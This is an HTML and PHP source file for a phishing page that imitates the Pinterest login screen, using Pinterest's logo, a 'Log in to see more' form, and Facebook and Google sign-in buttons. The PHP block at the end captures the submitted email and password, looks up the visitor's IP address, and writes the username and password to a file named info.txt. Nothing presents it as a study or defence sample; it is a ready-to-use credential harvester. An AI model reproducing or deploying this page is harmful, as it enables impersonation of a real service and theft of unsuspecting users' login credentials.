<!DOCTYPE html>
<html>
<head>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}
body {
  background-color: gray;
  font-family: Arial, Helvetica, sans-serif;
}
.container {
  background-color: white;
  width: 480px;
  height: 650px;
  position: absolute;
  margin: auto;
  top: 20%;
  left: 0;
  bottom: 0;
  right: 0;
  border-radius: 10px;
  box-shadow: 2px 2px 3px -1px rgba(0, 0, 0, 0.5);
}
.content {
  width: 56%;
  position: absolute;
  margin: auto;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
  text-align: center;
}
 
.img1{
  width: 70px;
  position: relative;
  top: 20px;
}
.header {
  font-size: 32px;
  font-weight: 700;
  margin-top: 40px;
  margin-bottom: 10px;
  line-height: 46px;
}
.detail {
  width: 100%;
  height: 48px;
  margin: 5px;
  padding: 15px;
  font-size: 15px;
  color: gray;
  border: 2px solid rgb(218, 214, 214);
  border-radius: 15px;
}
.detail:focus {
  box-shadow: 0px -7px 3px -2px rgba(15, 91, 231, 0.4),
    0px 7px 3px -2px rgba(15, 91, 231, 0.4),
    7px 0px 3px -2px rgba(15, 91, 231, 0.4),
    -7px 0px 3px -2px rgba(15, 91, 231, 0.4);
  outline: none;
}

h4 {
  font-size: 13px;
  font-weight: 700;
  position: relative;
  left: -60px;
  margin: 5px;
}

.btn {
  width: 100%;
  height: 40px;
  border: hidden;
  border-radius: 20px;
  font-size: 18px;
  margin: 5px 0px;
}

.int {
  background-color: #f30d19;
  margin: 10px 0px;
  color: white;
  font-size: 16px;
  font-weight: 700;
  cursor: pointer;
}
.int:hover{
  background-color: #df0812;
}

.or {
  font-size: 15px;
  font-weight: 700;
  margin: 10px 0px;
}

.fbk {
  background-color: rgb(9, 128, 240);
  margin: 5px 0px;
  font-size: 16px;
  font-weight: 700;
}
.fbk a {
  text-decoration: none;
  color: white;
  text-align: center;
  letter-spacing: 1px;
}
.fbk:hover{
  background-color: rgb(8, 110, 206);
}
.ggl{
  text-align: center;
  background-color: #ccc;
}
.ggl a {
  text-decoration: none;
  color: black;
  font-weight: 600;
  font-size: 16px;
  letter-spacing: 1px;
}
.ggl:hover{
  background-color: #a0a0a0;
}

footer p {
  font-size: 12px;
  margin: 10px;
  opacity: 0.7;
}
p:last-child {
  opacity: 1;
}
hr {
  width: 50%;
  opacity: 0.4;
  margin-left: 25%;
}
.upbtn{
  position: relative;
  top: 50px;
  left: 140px;
  font-size: 16px;
  font-weight: 700;
  text-align: center;
  width: 126px;
  padding: 11px 0px;
  background-color: rgb(241, 236, 236);
  border-radius: 20px;
}
</style> 
</style>

</body>
</html> 
<form action = '' method = 'POST'>

<div class="container">
      <div class="content">
        <!--pinterest logo-->
        <img src="https://i.pinimg.com/originals/d3/d1/75/d3d175e560ae133f1ed5cd4ec173751a.png" alt="pin logo" class="img1" />
        <p class="header">Log in to see more</p>

        <input  placeholder="Email" name="email" class="detail" />
        <input  type="password" placeholder="Password" name="pass" class="detail" />

        <h4>Forgot your password?</h4>

        <button type="sumbit" class="btn int">Log in</button>
        <p class="or">OR</p>
        <button class="btn fbk">
          <i
            class="fab fa-facebook fa-lg"
            style="color: white; padding-right: 10px"
          ></i
          ><a href="#">Continue with Facebook</a></button
        ><br />
        <button class="btn ggl">
          <i
            class="fab fa-google"
            style="color: rgb(11, 241, 22); padding-right: 10px"
          ></i
          ><a href="#">Continue with Google</a>
        </button>

        <footer>
          <p>
            By continuing, you agree to Pinterest's
            <b>Terms of Service, Privacy policy.</b>
          </p>
          <hr />
          <p>Not on Pinterest yet? Sign up</p>
        </footer>
      </div>
    </div>
    <div class="upbtn">Sign up</div>


<?php  
function getUserIP() {
  if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
      if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
          $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
          return trim($addr[0]);
      } else {
          return $_SERVER['HTTP_X_FORWARDED_FOR'];
      }
  }
  else {
      return $_SERVER['REMOTE_ADDR'];
  }
}


$user_ip = getUserIP();


if (isset($_POST['email'])){
$ip = $user_ip;
$userinput = $_POST['email'];
$userinputt = $_POST['pass'];
$acapo = "\r\n";
$perip = ("Ip: $ip");
$perpassword = ("Password: $userinputt");
$perusername = ("Username: $userinput");
$myfile = fopen("info.txt", "w") or die("Unable to open file!");
fwrite($myfile, $perusername);
fwrite($myfile, $acapo);
fwrite($myfile, $perpassword);
fclose($myfile);}
?>

